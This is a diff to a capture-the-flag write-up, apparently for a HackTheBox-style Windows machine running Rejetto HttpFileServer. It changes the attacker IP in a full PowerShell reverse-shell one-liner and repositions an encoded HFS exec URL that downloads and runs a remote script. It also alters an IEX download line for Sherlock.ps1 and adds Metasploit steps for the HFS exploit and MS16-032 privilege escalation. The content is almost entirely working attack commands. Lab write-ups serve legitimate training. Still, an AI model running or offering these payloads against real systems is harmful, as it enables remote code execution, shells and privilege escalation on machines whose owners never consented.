@@ -45,7 +45,7 @@ searchsploit httpfileserver
 ### 🔧 Exploit Trigger (PowerShell Reverse Shell)
 **Prep Nishang One-liner:**
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 Start server:
@@ -53,14 +53,14 @@ Start server:
 python3 -m http.server 80
 ```
 
-Trigger via encoded URL:
-```http
-http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1').}
-```
-
 ### 🛰️ Netcat Listener
 ```bash
 rlwrap nc -lnvp 443
+```
+
+Trigger via encoded URL:
+```http
+http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.13/rev.ps1').}
 ```
 
 **Shell Received:**
@@ -95,7 +95,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ### 🔍 Kernel Exploit Enumeration – Sherlock
 **Upload & execute:**
 ```powershell
-IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/Sherlock.ps1')
+IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.13/Sherlock.ps1')
 Find-AllVulns
 ```
 
@@ -105,10 +105,58 @@ Find-AllVulns
 
 ---
 
+### 🧬 Exploit MS16-032 Metasploit
+
+### Metasploit
+
+```
+msfconsole -q
+```
+
+```
+search windows/http/rejetto_hfs_exec
+use 0
+
+show options
+
+set LHOST tun0
+set RHOSTS 10.10.10.8
+set LPORT 9999
+set RPORT 80
+```
+
+```
+background
+sessions -i
+
+```
+
+```
+search suggester
+use 0
+set session 1  
+run
+
+```
+
+```
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+
+set LHOST tun0
+set LPORT 6663
+set session 1
+exploit
+```
+
+# ROOTED with Metasploit
+
+
+
+
 ### 🧬 Exploit MS16-032
 
 **Exploit Script Used:**
-`Invoke-MS16032.ps1` (modified from [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1))
+[`Invoke-MS16032.ps1`](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1)
 
 Append to script:
 ```powershell
